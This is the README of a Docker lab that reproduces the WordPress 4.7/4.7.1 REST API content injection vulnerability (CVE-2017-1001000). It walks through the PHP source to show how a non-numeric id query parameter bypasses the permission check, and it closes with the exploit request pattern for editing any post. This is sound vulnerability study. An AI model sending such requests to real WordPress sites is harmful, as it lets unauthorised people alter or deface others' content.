# docker-wordpress-content-injection

https://www.cvedetails.com/cve/CVE-2017-1001000/

## Install

```bash
docker-compose up
# In another terminal
./load_db.sh
```

* Open [http://127.0.0.1:8080/wp-admin/index.php](http://127.0.0.1:8080/wp-admin/index.php)
* Check Wordpress version (should be 4.7 or 4.7.1): W (top left) > About Wordpress
* Play with the API using the scripts `get_posts.sh` and `create_post.sh`

# Exploit

The requests are handled in `wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php`
[line 80](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L80).

The route needs a post id in the url:

```bash
./get_post.sh
```

If the id is not numeric, the API returns an error because the url does not match the regex:

```bash
./get_post_non_numeric.sh
```

If a query param `id` is specified, its value overrides the one in the url body:

```bash
./get_post_query_param.sh
# The obtained id is 11 and not 10
```

**But if the query param id is not numeric, no errors are raised:**

```bash
./get_post_query_param_non_numeric.sh
```

Now, let's look at the route to [update a post](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L93):

```php
// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L93

register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)', array(
    // ... 
    array(
        'methods'             => WP_REST_Server::EDITABLE,
        'callback'            => array( $this, 'update_item' ),
        'permission_callback' => array( $this, 'update_item_permissions_check' ),
        'args'                => $this->get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),
    ),
    // ...
) );
```

Before performing the update, the function [`wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:update_item_permissions_check`](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L589)
is called:

```php
// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L589

public function update_item_permissions_check( $request ) {
    $post = get_post( $request['id'] );
    $post_type = get_post_type_object( $this->post_type );
    if ( $post && ! $this->check_update_permission( $post ) ) {
        return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! empty( $request['author'] ) && get_current_user_id() !== $request['author'] && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
        return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! empty( $request['sticky'] ) && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
        return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! $this->check_assign_terms_permission( $request ) ) {
        return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    return true;
}
```

**Surprinsingly, if `$post` is null, the functions does not return an error.** And,
as we saw above, with a request such as
`POST http://127.0.0.1:8080/wp-json/wp/v2/posts/10?id=11ABC` the function will be
called with `$request['id'] = "11ABC"` and will call [`wp-includes/post.php:get_post`](https://github.com/Vayel/docker-wordpress-content-injection/blob/145c8df686c1ccf73d136d7a3c9204eeab98272a/wordpress/wp-includes/post.php#L515):

```php
// wp-includes/post.php#L515

function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {
	if ( empty( $post ) && isset( $GLOBALS['post'] ) )
		$post = $GLOBALS['post'];
	if ( $post instanceof WP_Post ) {
		$_post = $post;
	} elseif ( is_object( $post ) ) {
		if ( empty( $post->filter ) ) {
			$_post = sanitize_post( $post, 'raw' );
			$_post = new WP_Post( $_post );
		} elseif ( 'raw' == $post->filter ) {
			$_post = new WP_Post( $post );
		} else {
			$_post = WP_Post::get_instance( $post->ID );
		}
	} else {
		$_post = WP_Post::get_instance( $post );
	}
	if ( ! $_post )
		return null;
	$_post = $_post->filter( $filter );
	if ( $output == ARRAY_A )
		return $_post->to_array();
	elseif ( $output == ARRAY_N )
		return array_values( $_post->to_array() );
	return $_post;
}
```

`$post` will be a string (`"11ABC"`) so we will execute the follow line:

```php
// wp-includes/post.php#L531

$_post = WP_Post::get_instance( $post );
```

But [`wp-includes/class-wp-post.php:WP_Post::get_instance`](https://github.com/Vayel/docker-wordpress-content-injection/blob/145c8df686c1ccf73d136d7a3c9204eeab98272a/wordpress/wp-includes/class-wp-post.php#L210)
will return `false` as `$post_id` is not numeric:

```php
// wp-includes/class-wp-post.php#L210

public static function get_instance( $post_id ) {
    global $wpdb;
    if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
        return false;
    }
    // ...
}
```

Then `get_post` will return `null`:

```php
// wp-includes/post.php#L534

if ( ! $_post )
    return null;
```

So the permission check will pass. The function
[`wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:update_item`](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L622)
will be called with `$request['id'] = "11ABC"`:

```php
public function update_item( $request ) {
    $id   = (int) $request['id'];
    $post = get_post( $id );
    if ( empty( $id ) || empty( $post->ID ) || $this->post_type !== $post->post_type ) {
        return new WP_Error( 'rest_post_invalid_id', __( 'Invalid post ID.' ), array( 'status' => 404 ) );
    }
    // ...
}
```

But, here, the function `get_post` is called **with the id cast as an integer**. Due
to [PHP's type-juggling](http://php.net/manual/en/language.types.type-juggling.php),
the variable `$id` will be equal to `11` (`(int)"11ABC" === 11`). So `$post` won't
be `null` and we won't enter the `if`. **Because we have already
passed the permission check step**, Wordpress will update the post with id `11`
even if it belongs to another user.

**To conclude, it is possible for anyone to update any post of id `N` with a request such
as `POST /wp-json/wp/v2/posts/1984?id=N_then_non_numeric_chars`.**
